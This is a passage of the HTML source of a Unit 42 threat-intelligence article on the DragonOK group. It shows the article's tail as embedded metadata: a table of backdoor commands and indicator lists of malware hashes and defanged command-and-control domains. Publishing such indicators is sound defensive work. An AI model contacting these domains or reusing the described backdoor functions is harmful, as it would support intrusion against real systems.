IsSpace, however, the URIs have been modified.\n\n\n\nCommand\nDescription\nResponse URI\n\n\nCMD\nExecutes command\nSentrl.asp\n\n\nBrowse\nList specified directory\nSenjb.asp\n\n\nUploadFile\nUpload file\nSensp.asp\n\n\nDownLoad\nDownload file\nSenwhr.asp\n\n\nDelFile\nDelete file\nN\/A\n\n\n\nDragonOK Indicators\nMalicious RTF Documents\n\n020f5692b9989080b328833260e31df7aa4d58c138384262b9d7fb6d221e3673\n0d389a7b7dbdfdffcc9b503d0eaf3699f94d7a3135e46c65a4fa0f79ea263b40\n52985c6369571793bc547fc9443a96166e372d0960267df298221cd841b69545\n785398fedd12935e0ae5ac9c1d188f4868b2dc19fb4c2a13dab0887b8b3e220d\n941bcf18f7e841ea35778c971fc968317bee09f93ed314ce40815356a303a3ec\nba6f3581c5bcdbe7f23de2d8034aaf2f6dc0e67ff2cfe6e53cfb4d2007547b30\ndf9f33892e476458c74a571a9541aebe8f8d18b16278f594a6723f813a147552\n925880cc833228999ea06bd37dd2073784ab234ea00c5c4d55f130fe43a0940b\n3e4937d06ac86078f96f07117861c734a5fdb5ea307fe7e19ef6458f91c14264\n16204cec5731f64be03ea766b75b8997aad14d4eb61b7248aa35fa6b1873398b\n64f22de7a1e2726a2c649de133fad2c6ad089236db1006ce3d247c39ee40f578\nc3b5503a0a89fd2eae9a77ff92eef69f08d68b963140b0a31721bb4960545e07\nd227cf53b29bf0a286e9c4a1e84a7d70b63a3c0ea81a6483fdfabd8fbccd5206\n9190b1d3383c68bd0153c926e0ff3716b714eac81f6d125254054b277e3451fe\nd321c8005be96a13affeb997b881eaba3e70167a7f0aa5d68eeb4d84520cca02\nd38de4250761cb877dfec40344c1642542ca41331af50fa914a9597f8cc0ee9b\n5a94e5736ead7ea46dbc95f11a3ca10ae86c8ae381d813975d71feddf14fc07a\nbbdc9f02e7844817def006b9bdef1698412efb6e66346454307681134046e595\n\nIsSpace \n\n12d88fbd4960b7caf8d1a4b96868138e67db40d8642a4c21c0279066aae2f429\n1a6e3cd2394814a72cdf8db55bc3f781f7e1335b31f77bffc1336f0d11cf23d1\n\nC2 Domains\n\nwww.dppline[.]org\nwww.matrens[.]top\n\nC2 Domains\n\neurope.wikaba[.]com\nrussiaboy.ssl443[.]org\ncool.skywave[.]top\n\nSysget Version 2 \n\n82f028e147471e6f8c8d283dbfaba3f5629eda458d818e1a4ddb8c9337fc0118\n\nC2 Domains\n\nnewtw2016.kr44.78host[.]com\n\nSysget Version 3\n\n02fc713c1b2c607dff4fc6c4797b39e42ee576578f6af97295495b9b172158b9\na0b0a49da119d971fa3cf2f5647ccc9fe7e1ff989ac31dfb4543f0cb269ed105\nb49cb2c51bc2cc5e48585b9b0f7dd7ff2599a086a4219708b102890ab3f4daf3\nb8f9c1766ccd4557383b6643b060c15545e5f657d87d82310ed1989679dcfac4\nd75433833a3a4453fe35aaf57d8699d90d9c4a933a8457f8cc37c86859f62d1e\n685076708ace9fda65845e4cbb673fdd6f11488bf0f6fd5216a18d9eaaea1bbc\n7fcc86ebca81deab264418f7ae5017a6f79967ccebe8bc866efa14920e4fd909\nc5c3e8caffd1d416c1fd8947e60662d82638a3508dbcf95a6c9a2571263bdcef\n\nC2 Domains\n\ngtoimage[.]com\ntrend.gogolekr[.]com\nAdditional Indicators\nSysget Version 2 \n\na768d63f8127a8f87ff7fa8a7e4ca1f7e7a88649fe268cf1bd306be9d8069564\n2bf737f147e761586df1c421584dba350fd865cb14113eee084f9d673a61ee67\n2c7c9fd09a0a783badfb42a491ccec159207ee7f65444088ba8e7c8e617ab5a5\nd91439c8faa0c42162ea9a6d3c282d0e76641a31f5f2fbc58315df9c0b90059c\n89d8d52c09dc09aeb41b1e9fafeacf1c038912d8c6b75ad4ef556707b15641ff\n6c1d56cb16f6342e01f4ebfc063db2244aef16d0a248332348dcdb31244d32f2\n9c66232061fbb08088a3b680b4d0bffbbce1ce01d0ce5f0c4d8bf17f42d45682\nb138ea2e9b78568ebd9d71c1eb0e31f9cf8bc41cd5919f6522ef498ffcc8762a\n8830400c6a6d956309ac9bcbcceee2d27ba8c89f9d89f4484aba7d5680791459\nbda66f13202cef8cfb23f36ac0aee5c23f82930e1f38e81ba807f5c4e46128e3\ne8197e711018afd25a32dc364a9155c7e2a0c98b3924dc5f67b8cd2df16406ff\ne9c0838e2433a86bc2dec56378bd59627d6332ffb1aec252f5117938d00d9f74\nc63685b2497e384885e4b4649428d665692e8e6981dad688e8543110174f853b\n2c9c2bfea64dd95495703fcec59ad4cf74c43056b40ed96d40db9b919cfd050b\n94850525ea9467ae772c657c3b8c72663eaa28b2c995b22a12b09e4cacecad6d\ne8bd20e3d8491497ca2d6878b41fb7be67abb97ee272ef8b6735faa6acd67777\n\nC2 Domains\n\nhello.newtaiwan[.]top\nbullskingdom[.]com\nmail.googleusa[.]top\nwww.modelinfos[.]com\nmodelinfos[.]com\nwww.sanspozone[.]com\n\nSysget Version 3\n\nf9a1607cdcfd83555d2b3f4f539d3dc301d307e462a999484d7adb1f1eb9edf6\n7f286fbc39746aa8feeefc88006bedd83a3176d2235e381354c3ea24fe33d21c\n3b554ef43d9f3e70ead605ed38b5e66c0b8c0b9fc8df16997defa8e52824a2a6\n8d7406f4d5759574416b8e443dd9d9cd6e24b5e39b1f5bc679e4a1ad54d409c6\nedf32cb7aad7ae6f545f7d9f11e14a8899ab0ac51b224ed36cfc0d367daf5785\ndb19b9062063302d938bae51fe332f49134dc2e1947d980c82e778e9d7ca0616\ncde217acb6cfe20948b37b16769164c5f384452e802759eaabcfa1946ea9e18b\n9bee4f8674ee067159675f66ca8d940282b55fd1f71b8bc2aa32795fd55cd17e\n39539eb972de4e5fe525b3226f679c94476dfc88b2032c70e5d7b66058619075\nc45145ca9af7f21fff95c52726ff82595c9845b8e9d0dbf93ffe98b7a6fa8ee9\n55325e9fccbdada83279e915e5aeb60d7b117f154fa2c3a38ec686d2552b1ebc\n2c7d29da1b5468b49a4aef31eee6757dc5c3627bf2fbfb8e01dec12aed34736a\n16dc75cf16d582eac6cbbe67b048a31fffa2fb525a76c5794dad7d751793c410\n91eee738f99174461b9a4085ea70ddafc0997790e7e5d6d07704dcbbc72dc8bf\n4a702ffbf01913cc3981d9802c075160dfd1beed3ba0681153d17623f781f53f\ne8bed52c58759e715d2a00bdb8a69e7e93def8d4f83d95986da21a549f4d51c5\ned5598716de2129915f427065f0a22f425f4087584e1fa176c6de6ad141889d1\nadc86af1c03081482fe9ba9d8a8ae875d7217433164d54e40603e422451a2b90\nf0540148768247ed001f3894cdfa52d8e40b17d38df0f97e040a49baa3f5c92e\nce38a6e4f15b9986474c5d7c8a6e8b0826330f0135e1da087aae9eab60ea667a\n5c4e98922e6981cf2a801674d7e79a573ebcdc9ebc875ef929511f585b9c4781\n4880b43ddc8466d910b7b49b6779970c38ce095983cad110fa924b41f249f898\n76b6f0359a3380943fece13033b79dc586706b8348a270ac71b589a5fd5790a4\nfeab16570c11ec713cfa952457502c7edd21643129c846609cb13cdc0ae4671c\ned9ca7c06aac7525da5af3d1806b32eeb1c1d8f14cc31382ca52a14ed62f00a9\na3aa4b3b3471b0bb5b2f61cbc8a94edef4988436e0bc55e9503173c836fb57a3\n29ee56ca66187ece41c1525ad27969a4b850a45815057a31acee7cc76e970909\n65201380443210518621da9feb45756eac31213a21a81583cc158f8f65d50626\ncccb906d06aef1e33d12b8b09c233e575482228d40ac17232acad2557da4e53b\n\nC2 Domains\n\ngtoimage[.]com\ntrend.gogolekr[.com\nwww.bestfiles[.]top\n\nSysget Version 4\n\n2ac8bc678e5fa3e87d34aee06d2cd56ab8e0ed04cd236cc9d4c5e0fa6d303fa3\n8dc539e3d37ccd522c594dc7378c32e5b9deeffb37e7a7a5e9a96b9a23df398e\n\nC2 Domains\n\nwww.sanseitime[.]com\n\n\u00a0","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2016\/09\/unit42-web-banner-650x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Josh Grunzweig"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"23027","token":"7e15a0f8b3","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=23027' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-dragonok-updates-toolset-targets-multiple-geographic-regions%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-dragonok-updates-toolset-targets-multiple-geographic-regions%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-23027 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">DragonOK Updates Toolset and Targets Multiple Geographic Regions</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-23027 entry-meta">
			
			
			<span class="post-views-count">26,282</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'23027','like')"><i class="ui ui-2"></i><span class="ml-5">0</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 15</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-dragonok-updates-toolset-targets-multiple-geographic-regions%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-dragonok-updates-toolset-targets-multiple-geographic-regions%2F+-+DragonOK+Updates+Toolset+and+Targets+Multiple+Geographic+Regions" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-dragonok-updates-toolset-targets-multiple-geographic-regions%2F&title=DragonOK+Updates+Toolset+and+Targets+Multiple+Geographic+Regions&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/unit42-dragonok-updates-toolset-targets-multiple-geographic-regions/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/joshgruznweig/" title="Posts by Josh Grunzweig" class="author url fn" rel="author">Josh Grunzweig</a>        </p>
        <p><time datetime="2017-01-05T06:00:46+00:00">January 5, 2017 at 8:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/dragonok/" rel="tag">DragonOK</a>, <a href="https://unit42.paloaltonetworks.com/tag/japan/" rel="tag">Japan</a>, <a href="https://unit42.paloaltonetworks.com/tag/threat-intelligence/" rel="tag">threat intelligence</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
